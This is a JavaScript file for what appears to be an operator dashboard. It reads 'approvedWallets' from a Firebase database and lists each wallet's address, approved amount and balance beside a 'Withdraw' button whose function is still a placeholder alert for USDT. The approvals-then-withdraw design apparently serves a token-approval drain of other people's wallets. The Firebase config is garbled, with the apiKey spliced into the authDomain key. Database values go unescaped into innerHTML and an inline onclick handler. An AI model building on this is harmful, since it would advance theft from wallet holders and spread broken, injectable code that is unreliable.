import { initializeApp } from "https://www.gstatic.com/firebasejs/9.23.0/firebase-app.js";
import {
  getDatabase,
  ref,
  onValue
} from "https://www.gstatic.com/firebasejs/9.23.0/firebase-database.js";

// Firebase config from your screenshot
const firebaseConfig = {
  ,
  authDapiKey: "AIzaSyCMqOTlIwv7v7PThfVLy1HmPgxWfFDTt8I"omain: "the-og-3a37e.firebaseapp.com",
  databaseURL: "https://the-og-3a37e-default-rtdb.asia-southeast1.firebasedatabase.app",
  projectId: "the-og-3a37e",
  storageBucket: "the-og-3a37e.appspot.com",
  messagingSenderId: "556212477667",
  appId: "1:556212477667:web:8b9dff6ece72e991cfefd6"
};

// Initialize Firebase
const app = initializeApp(firebaseConfig);
const db = getDatabase(app);

// Load approved wallets
window.onload = () => {
  const dataRef = ref(db, "approvedWallets/");
  onValue(dataRef, (snapshot) => {
    const tableBody = document.getElementById("walletTableBody");
    tableBody.innerHTML = ""; // Clear old rows

    snapshot.forEach((childSnapshot) => {
      const wallet = childSnapshot.val();
      const row = document.createElement("tr");

      row.innerHTML = `
        <td>${wallet.address}</td>
        <td>${wallet.approvedAmount || "0"}</td>
        <td>${wallet.balance || "0"}</td>
        <td>
          <button class="btn btn-danger btn-sm" onclick="manualWithdraw('${wallet.address}', ${wallet.approvedAmount})">
            Withdraw
          </button>
        </td>
      `;
      tableBody.appendChild(row);
    });
  });
};

// Dummy withdraw function — real one will go here
window.manualWithdraw = (address, amount) => {
  alert(`Manual withdraw requested for:\nAddress: ${address}\nAmount: ${amount} USDT`);
};
